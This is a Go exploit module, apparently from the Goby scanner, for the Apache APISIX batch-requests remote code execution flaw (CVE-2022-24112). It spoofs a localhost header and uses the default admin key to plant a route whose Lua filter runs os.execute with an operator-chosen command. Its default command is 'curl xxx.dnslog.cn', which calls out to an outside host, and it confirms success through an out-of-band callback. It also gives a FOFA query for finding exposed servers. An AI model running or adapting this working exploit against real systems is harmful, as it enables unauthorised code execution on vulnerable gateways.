package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Apache APISIX batch-requests Plugins RCE (CVE-2022-24112)",
    "Description": "<p>Apache Apisix is a cloud-native microservice API gateway service of the Apache Foundation. The software is implemented based on OpenResty and etcd, with dynamic routing and plug-in hot loading, suitable for API management under the microservice system.</p><p>A remote code execution vulnerability exists in Apache APISIX. The vulnerability stems from the fact that the batch-requests plugin of the product does not effectively limit the user's batch requests. An attacker can use this vulnerability to bypass the restrictions of the Admin API to execute arbitrary code.</p>",
    "Impact": "<p>A remote code execution vulnerability exists in Apache APISIX. The vulnerability stems from the fact that the batch-requests plugin of the product does not effectively limit the user's batch requests. An attacker can use this vulnerability to bypass the restrictions of the Admin API to execute arbitrary code.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://lists.apache.org/thread/lcdqywz8zy94mdysk7p3gfdgn51jmt94\">https://lists.apache.org/thread/lcdqywz8zy94mdysk7p3gfdgn51jmt94</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Product": "Apache APISIX",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Apache APISIX batch-requests 插件远程代码执行漏洞（CVE-2022-24112）",
            "Product": "Apache APISIX",
            "Description": "<p>Apache Apisix是美国阿帕奇（Apache）基金会的一个云原生的微服务API网关服务。该软件基于 OpenResty 和 etcd 来实现，具备动态路由和插件热加载，适合微服务体系下的 API 管理。</p><p>Apache APISIX 中存在远程代码执行漏洞，该漏洞源于产品的batch-requests插件未对用户的批处理请求进行有效限制。攻击者可通过该漏洞绕过Admin Api的限制执行任意代码。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://lists.apache.org/thread/lcdqywz8zy94mdysk7p3gfdgn51jmt94\">https://lists.apache.org/thread/lcdqywz8zy94mdysk7p3gfdgn51jmt94</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>Apache APISIX 中存在远程代码执行漏洞，该漏洞源于产品的batch-requests插件未对用户的批处理请求进行有效限制。攻击者可通过该漏洞绕过Admin Api的限制执行任意代码。</p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Apache APISIX batch-requests Plugins RCE (CVE-2022-24112)",
            "Product": "Apache APISIX",
            "Description": "<p>Apache Apisix is a cloud-native microservice API gateway service of the Apache Foundation. The software is implemented based on OpenResty and etcd, with dynamic routing and plug-in hot loading, suitable for API management under the microservice system.</p><p>A remote code execution vulnerability exists in Apache APISIX. The vulnerability stems from the fact that the batch-requests plugin of the product does not effectively limit the user's batch requests. An attacker can use this vulnerability to bypass the restrictions of the Admin API to execute arbitrary code.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://lists.apache.org/thread/lcdqywz8zy94mdysk7p3gfdgn51jmt94\">https://lists.apache.org/thread/lcdqywz8zy94mdysk7p3gfdgn51jmt94</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">A remote code execution vulnerability exists in Apache APISIX. The vulnerability stems from the fact that the batch-requests plugin of the product does not effectively limit the user's batch requests. An attacker can use this vulnerability to bypass the restrictions of the Admin API to execute arbitrary code.</span><br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "banner=\"Server: APISIX\" || header=\"Server: APISIX\"",
    "GobyQuery": "banner=\"Server: APISIX\" || header=\"Server: APISIX\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://github.com/apache/apisix",
    "DisclosureDate": "2022-02-21",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2022-24112"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2022-24112"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202202-1030"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "curl xxx.dnslog.cn",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10257"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			RandPath := goutils.RandomHexString(4)
			uri1 := "/apisix/batch-requests"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/json")
			cfg1.Data = fmt.Sprintf("{\r\n          \"headers\":{\r\n            \"X-Real-IP\":\"127.0.0.1\",\r\n            \"Content-Type\":\"application/json\"\r\n          },\r\n          \"timeout\":1500,\r\n          \"pipeline\":[\r\n            {\r\n              \"method\":\"PUT\",\r\n              \"path\":\"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1\",\r\n              \"body\":\"{\\r\\n \\\"name\\\": \\\"%s\\\", \\\"method\\\": [\\\"GET\\\"],\\r\\n \\\"uri\\\": \\\"/api/%s\\\",\\r\\n \\\"upstream\\\":{\\\"type\\\":\\\"roundrobin\\\",\\\"nodes\\\":{\\\"httpbin.org:80\\\":1}}\\r\\n,\\r\\n\\\"filter_func\\\": \\\"function(vars) os.execute('curl %s'); return true end\\\"}\"\r\n            }\r\n          ]\r\n        }\r\n", RandPath, RandPath, checkUrl)
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil && resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "reason") {
				uri2 := "/api/" + RandPath
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				httpclient.DoHttpRequest(u, cfg2)
				return godclient.PullExists(checkStr, time.Second*10)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			RandPath := goutils.RandomHexString(4)
			uri1 := "/apisix/batch-requests"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/json")
			cfg1.Data = fmt.Sprintf("{\r\n          \"headers\":{\r\n            \"X-Real-IP\":\"127.0.0.1\",\r\n            \"Content-Type\":\"application/json\"\r\n          },\r\n          \"timeout\":1500,\r\n          \"pipeline\":[\r\n            {\r\n              \"method\":\"PUT\",\r\n              \"path\":\"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1\",\r\n              \"body\":\"{\\r\\n \\\"name\\\": \\\"%s\\\", \\\"method\\\": [\\\"GET\\\"],\\r\\n \\\"uri\\\": \\\"/api/%s\\\",\\r\\n \\\"upstream\\\":{\\\"type\\\":\\\"roundrobin\\\",\\\"nodes\\\":{\\\"httpbin.org:80\\\":1}}\\r\\n,\\r\\n\\\"filter_func\\\": \\\"function(vars) os.execute('%s'); return true end\\\"}\"\r\n            }\r\n          ]\r\n        }\r\n", RandPath, RandPath, cmd)
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil && resp1.StatusCode == 200 {
				uri2 := "/api/" + RandPath
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				httpclient.DoHttpRequest(expResult.HostInfo, cfg2)
				expResult.Output = "please see your dnslog"
				expResult.Success = true
			}
			return expResult
		},
	))
}
